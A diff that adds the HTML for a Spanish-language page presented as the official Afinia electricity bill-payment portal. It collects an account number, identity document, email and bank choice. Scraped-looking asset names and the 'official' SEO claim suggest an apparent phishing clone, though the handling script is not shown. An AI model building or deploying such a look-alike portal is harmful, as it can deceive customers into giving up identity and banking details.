@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Afinia Pagos</title>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    
+</head>
+<body>
+
+    <div class="menu-overlay" id="menu-overlay"></div>
+
+    <div id="full-loader" class="full-loader hidden">
+        <div class="loader-content">
+            <div class="spinner-large"></div>
+            <h2 id="loader-title">Procesando solicitud...</h2>
+            <p id="loader-text">Por favor espere, no cierre la ventana.</p>
+        </div>
+    </div>
+
+    <header class="main-header">
+        <div class="header-left">
+            <button class="menu-btn" id="menu-toggle">
+                <span class="material-icons">menu</span>
+            </button>
+            <div class="logo-container">
+                <img src="img/afinialogo2.png" alt="Afinia Logo" class="header-logo">
+            </div>
+        </div>
+    </header>
+
+    <div class="app-container">
+        <aside class="sidebar" id="sidebar">
+            <nav class="sidebar-nav">
+                <a href="#" class="nav-item">
+                    <span class="material-icons">home</span>
+                    <span class="nav-text">INICIO PORTAL DE PAGOS</span>
+                </a>
+                <a href="#" class="nav-item active">
+                    <span class="material-icons">credit_card</span>
+                    <span class="nav-text">PAGAR</span>
+                </a>
+                <a href="#" class="nav-item"><span class="material-icons">lock</span><span class="nav-text">RECUPERAR CUENTA</span></a>
+                <a href="#" class="nav-item"><span class="material-icons">lock_open</span><span class="nav-text">RECUPERAR CONTRASEÑA</span></a>
+                <a href="#" class="nav-item"><span class="material-icons">search</span><span class="nav-text">DUPLICADOS</span></a>
+                <a href="#" class="nav-item"><span class="material-icons">person_add</span><span class="nav-text">REGISTRO USUARIO</span></a>
+                <div class="nav-divider"></div>
+                <a href="#" class="nav-item has-arrow">
+                    <div class="nav-content"><span class="material-icons">description</span><span class="nav-text">FACTURA DIGITAL</span></div>
+                    <span class="material-icons arrow-icon">chevron_left</span>
+                </a>
+                <a href="#" class="nav-item"><span class="material-icons">edit</span><span class="nav-text">PQR'S</span></a>
+                <a href="#" class="nav-item"><span class="material-icons">monetization_on</span><span class="nav-text">RECARGA</span></a>
+            </nav>
+            <div class="sidebar-footer">© 2024 FACTURE SAS BY ESTELA</div>
+        </aside>
+
+        <main class="main-content">
+            <div class="page-header-full-width">
+                <h1 class="page-title">PAGAR</h1>
+            </div>
+
+            <div class="scrollable-body">
+                <div class="inner-content">
+                    <div class="banner-wrapper">
+                        <img src="img/imgi_3_Banner - Pagar.jpg" alt="Banner" class="banner-img">
+                    </div>
+
+                    <p class="info-text">
+                        Te invitamos a registrarte en nuestra plataforma para que disfrutes de todas nuestras funcionalidades.
+                    </p>
+
+                    <div class="form-card">
+                        <form id="payment-form">
+                            
+                            <div class="form-row nic-row">
+                                <div class="input-group nic-input">
+                                    <label class="input-label">NIC <span class="required">*</span></label>
+                                    <input type="text" class="material-input" value="" id="input-nic" placeholder="Ingrese su NIC">
+                                </div>
+                                
+                                <div class="btn-wrapper-nic">
+                                    <button type="button" class="btn-primary" id="btn-pago-mes">PAGO MES</button>
+                                    <div class="spinner-small hidden" id="spinner-nic"></div>
+                                </div>
+                            </div>
+
+                            <div id="hidden-fields" class="hidden-section hidden">
+                                
+                                <div class="valor-pagar-container">
+                                    <span class="valor-label">Valor a pagar: </span>
+                                    <span class="valor-amount" id="valor-display">$0</span>
+                                </div>
+
+                                <div class="form-row double-col">
+                                    <div class="input-group">
+                                        <label class="input-label">Documento <span class="required">*</span></label>
+                                        <input type="text" class="material-input" value="" id="input-documento">
+                                    </div>
+
+                                    <div class="input-group">
+                                        <label class="input-label">Correo <span class="required">*</span></label>
+                                        <input type="email" class="material-input" value="" id="input-email">
+                                    </div>
+                                </div>
+
+                                <div class="form-row bank-row">
+                                    <div class="input-group bank-input">
+                                        <label class="input-label">Banco <span class="required">*</span></label>
+                                        <div class="select-wrapper">
+                                            <select class="material-input" id="banco-select">
+                                                <option value="" disabled selected>Seleccione un banco</option>
+                                                <option>BANCOLOMBIA</option>
+                                                <option>NEQUI</option>
+                                                <option>DAVIPLATA</option>
+                                                <option>BANCO DAVIVIENDA</option>
+                                                <option>BANCO DE BOGOTA</option>
+                                                <option>BANCO BBVA COLOMBIA S.A.</option>
+                                                <option>BANCO DE OCCIDENTE</option>
+                                                <option>BANCO CAJA SOCIAL</option>
+                                                <option>BANCO AV VILLAS</option>
+                                                <option>NU. COLOMBIA COMPAÑIA DE FINANCIAMIENTO S.A.</option>
+                                                <option>LULO BANK</option>
+                                                <option>RAPPIPAY</option>
+                                                <option>ALIANZA FIDUCIARIA</option>
+                                                <option>BANCAMIA S.A.</option>
+                                                <option>BANCO AGRARIO</option>
+                                                <option>BANCO COOPERATIVO COOPCENTRAL</option>
+                                                <option>BANCO CREDIFINANCIERA</option>
+                                                <option>BANCO FALABELLA</option>
+                                                <option>BANCO FINANDINA S.A. BIC</option>
+                                                <option>BANCO GNB SUDAMERIS</option>
+                                                <option>BANCO ITAU</option>
+                                                <option>BANCO MUNDO MUJER S.A.</option>
+                                                <option>BANCO PICHINCHA S.A.</option>
+                                                <option>BANCO POPULAR</option>
+                                                <option>BANCO PROCREDIT</option>
+                                                <option>BANCO SANTANDER COLOMBIA</option>
+                                                <option>BANCO SERFINANZA</option>
+                                                <option>BANCO UNION antes GIROS</option>
+                                                <option>BANCOOMEVA S.A.</option>
+                                                <option>CFA COOPERATIVA FINANCIERA</option>
+                                                <option>CITIBANK</option>
+                                                <option>COLTEFINANCIERA</option>
+                                                <option>CONFIAR COOPERATIVA FINANCIERA</option>
+                                                <option>COOFINEP COOPERATIVA FINANCIERA</option>
+                                                <option>COTRAFA</option>
+                                                <option>CREZCAMOS S.A. COMPAÑÍA DE FINANCIAMIENTO</option>
+                                                <option>DALE</option>
+                                                <option>IRIS</option>
+                                                <option>JFK COOPERATIVA FINANCIERA</option>
+                                                <option>BANCO J.P. MORGAN COLOMBIA S.A.</option>
+                                                <option>MOVII S.A.</option>
+                                                <option>BOLD CF</option>
+                                                <option>DING</option>
+                                                <option>FINANCIERA JURISCOOP SA COMPAÑÍA DE FINANCIAMIENTO</option>
+                                                <option>DAVIbank S.A.</option>
+                                                <option>LULO BANK</option>
+                                                <option>POWWI</option>
+                                                <option>RAPPIPAY</option>
+                                                <option>UALÁ</option>
+                                            </select>
+                                            <span class="material-icons select-arrow">expand_more</span>
+                                        </div>
+                                    </div>
+
+                                    <div class="btn-wrapper-final">
+                                        <button type="button" class="btn-pagar-final" id="btn-pagar-final">PAGAR</button>
+                                    </div>
+                                </div>
+                            </div>
+
+                        </form>
+                    </div>
+
+                    <footer class="seo-section">
+                        <p class="powered">Powered By Facture una Marca de Estela</p>
+                        <div class="seo-links">
+                            <h2>Afinia Pagar Factura - Sistema Oficial de Afinia Pagos</h2>
+                            <h3>¿Cómo Pagar tu Factura de Afinia?</h3>
+                            <p><strong>Afinia pagar factura</strong> es el sistema oficial de <strong>afinia pagos</strong> para consultar y pagar tu recibo de luz en línea...</p>
+                        </div>
+                    </footer>
+                </div>
+            </div>
+        </main>
+    </div>
+    <script src="js/index.js"></script>
+</body>
+</html>
